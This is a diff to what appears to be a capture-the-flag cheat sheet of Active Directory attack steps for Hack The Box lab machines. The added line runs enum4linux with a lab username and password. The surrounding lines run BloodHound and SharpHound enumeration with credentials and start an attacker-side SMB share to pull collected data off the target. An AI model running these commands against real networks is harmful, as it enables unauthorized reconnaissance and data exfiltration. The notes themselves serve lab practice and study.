@@ -34,6 +34,10 @@
 + pip3 install bloodhound
 - bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly --dns-timeout 20
 ```
+30. Try to run enum4linux with username/password 
+```diff
++ enum4linux -a -u support -p '#00^BlackKnight' 10.10.10.192
+```
 31. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
 32. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
 33. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
